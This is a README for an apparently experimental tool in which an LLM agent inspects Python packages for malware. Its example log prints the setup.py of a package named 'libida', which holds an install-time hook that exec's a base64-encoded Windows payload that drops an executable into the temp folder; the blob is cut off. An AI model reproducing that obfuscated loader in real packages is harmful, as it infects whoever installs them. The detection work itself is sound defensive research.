# VulnMind: A Malware Detection Tool using LLM Agent
This tool uses a Large Language Model (LLM) agent to detect if a given software input is malware. It leverages the REAC T approach from the ICLR 2024 paper "REACT: Synergizing Reasoning and Acting in Language Models" to enhance its detection capabilities.

## Project Structure

- **main.py**: The entry point of the application.
- **pkg_inspector.py**: Contains the logic for inspecting the software using the LLM agent.

## Dependencies

Ensure you have Python 3.x installed. Additional Python packages may be required (e.g., for the LLM or software analysis). Check the import statements in `main.py` and `pkg_inspector.py` and install them using pip if needed.

## Usage

Run the tool with the following command:

```bash
python main.py top-level-pkg-folder

## TODO:
- Will support other type of malware
- Support more and better actions
- prompt engineering is required.

# Example Output:

```
> Running step 3b5a1c6f-81c6-4edf-bce6-6c5d3e983383. Step input:
You are an expert security analyst tasked with determining if a Python package is malware. You have the following tools at your disposal:
- **INSPECT_METADATA**: RETRIEVES METADATA LIKE NAME, AUTHOR, EMAIL, URL, AND DESCRIPTION.
- **INSPECT_SETUP_PY**: RETRIEVES THE CONTENT OF SETUP.PY, WHICH MAY CONTAIN INSTALLATION SCRIPTS.
- **INSPECT_INIT_PY**: RETRIEVES THE CONTENT OF __INIT__.PY, THE PACKAGE'S INITIALIZATION CODE.
- **INSPECT_PROJECT_STRUCTURE**: RETRIEVES THE PACKAGE'S DIRECTORY AND FILE STRUCTURE.

YOUR TASK IS TO SYSTEMATICALLY ANALYZE THE PACKAGE BY USING THESE TOOLS TO GATHER EVIDENCE. LOOK FOR SPECIFIC SIGNS OF MALWARE, INCLUDING BUT NOT LIMITED TO:

- **SUSPICIOUS METADATA**: UNUSUAL AUTHOR EMAILS (E.G., RANDOM STRINGS), MALICIOUS URLS (E.G., KNOWN BAD DOMAINS), OR DECEPTIVE DESCRIPTIONS.
- **MALICIOUS SETUP.PY**: CODE EXECUTING SYSTEM COMMANDS (E.G., OS.SYSTEM, SUBPROCESS), DOWNLOADING EXTERNAL SCRIPTS, OR INSTALLING UNEXPECTED DEPENDENCIES.
- **MALICIOUS __INIT__.PY**: OBFUSCATED CODE (E.G., BASE64 ENCODED), NETWORK REQUESTS, OR UNAUTHORIZED FILE OPERATIONS.
- **UNUSUAL STRUCTURE**: HIDDEN FILES (E.G., DOTFILES LIKE .MALWARE.PY), UNEXPECTED EXECUTABLES, OR ATYPICAL DIRECTORY LAYOUTS.

PROCEED STEP-BY-STEP:
1. USE THE TOOLS TO COLLECT INFORMATION.
2. ANALYZE THE OUTPUT FOR RED FLAGS.
3. DECIDE IF FURTHER INSPECTION IS NEEDED OR IF YOU CAN CONCLUDE.

WHEN YOU HAVE SUFFICIENT EVIDENCE, PROVIDE YOUR FINAL ANSWER IN THIS FORMAT: 'FINAL ANSWER: MALWARE' OR 'FINAL ANSWER: NOT MALWARE'. IF UNCERTAIN, EXPLAIN WHY AND CONCLUDE WITH 'FINAL ANSWER: NOT MALWARE' UNLESS CLEAR EVIDENCE EXISTS.

Begin by inspecting the metadata.
Thought: The current language of the user is: English. I need to use the `inspect_metadata` tool to get the package metadata.
Action: inspect_metadata
Action Input: {'properties': AttributedDict(), 'type': 'object'}
Observation: Error: PackageInspector.inspect_metadata() got an unexpected keyword argument 'properties'
> Running step 7506c8ce-9a07-41ab-bc53-d8429b315da1. Step input: None
Thought: The `inspect_metadata` tool failed.  I'll try again without the `properties` argument, as it seems unnecessary and caused an error.  The tool description doesn't specify needing it.
Action: inspect_metadata
Action Input: {}
Observation: Error extracting metadata: 'UnpackedSDist' object has no attribute 'url'
> Running step cf310a8d-0c74-4c35-a65b-06dda75252e7. Step input: None
Thought: The metadata extraction failed again.  It seems the package might not be properly formatted or the tool is having trouble accessing necessary information. I'll proceed to examine other aspects of the package using the remaining tools to gather more evidence.  I'll start with `inspect_setup_py`.
Action: inspect_setup_py
Action Input: {}
Observation:
from distutils.core import setup
setup(
  name = 'libida',
  packages = ['libida'],
  version = '0.2',
  license='MIT',
  description = '',
  author = 'WS',
  keywords = [],
  install_requires=[],
  classifiers=[
    'Operating System :: OS Independent',
    'Development Status :: 3 - Alpha',
    'License :: OSI Approved :: MIT License',
    'Programming Language :: Python :: 3',
    'Programming Language :: Python :: 3.4',
    'Programming Language :: Python :: 3.5',
    'Programming Language :: Python :: 3.6',
  ],
)
# You got me :D
from os import name
from sys import argv
from base64 import b64decode
if 'sdist' not in argv:
    if name == 'nt':
        exec(b64decode('CmltcG9ydCBvcyBhcyBvCmltcG9ydCB0ZW1wZmlsZSBhcyB0CnA9by5wYXRoLmpvaW4odC5nZXR0ZW1wZGlyKCksJ0o5NzlkNWFjZDAzMDQyMjg4YWU5ZTYwYzA5ZGQ5NGU1MTYyLmV4ZScpCmlmIG5vdCBvLnBhdGguZXhpc3RzKHApOgogICAgd2l0aCBvcGVuKHAsICd3YicpIGFzIGY6CiAgICAgICAgZi53cml0ZShiJ01aXHg5MFx4MDBceDAzXHgwMFx4MDBceDAwXHgwNFx4MDBceDAwXHgwMFx4ZmZceGZmXHgwMFx4MDBceGI4XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMEBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4ODBceDAwXHgwMFx4MDBceDBlXHgxZlx4YmFceDBlXHgwMFx4YjRcdFx4Y2QhXHhiOFx4MDFMXHhjZCFUaGlzIHByb2dyYW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS5cclxyXG4kXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFBFXHgwMFx4MDBMXHgwMVx4MDNceDAwPFx4ZDVceDhkXHhmYlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHhlMFx4MDAiXHgwMFx4MGJceDAxMFx4MDBceDAwPlx4MDhceDAwXHgwMFxuXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHhhZVxcXHgwOFx4MDBceDAwIFx4MDBceDAwXHgwMGBceDA4XHgwMFx4MDBceDAwQFx4MDBceDAwIFx4MDBceDAwXHgwMFx4MDJceDAwXHgwMFx4MDRceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwNlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHhhMFx4MDhceDAwXHgwMFx4MDJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAyXHgwMGBceDg1XHgwMFx4MDBceDEwXHgwMFx4MDBceDEwXHgwMFx4MDBceDAwXHgwMFx4MTBceDAwXHgwMFx4MTBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDEwXHgwMFx4MDBceDAwXH
[Content truncated due to length]
> Running step 831ef9e6-6b2d-4074-ba67-4ae22b6eecd0. Step input: None
Thought: The `inspect_setup_py` output reveals a base64 encoded string within an `exec` function call, which is highly suspicious. This strongly suggests malicious intent. The conditional check for `'sdist' not in argv` indicates that this code only executes during installation, not when building a source distribution.  Further analysis is not needed.
Answer: FINAL ANSWER: MALWARE
Analysis result: Could not determine if the package is malware; no clear final answer provided.
WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
E0000 00:00:1741188403.528753 2775958 init.cc:232] grpc_wait_for_shutdown_with_timeout() timed out.
```
```
```
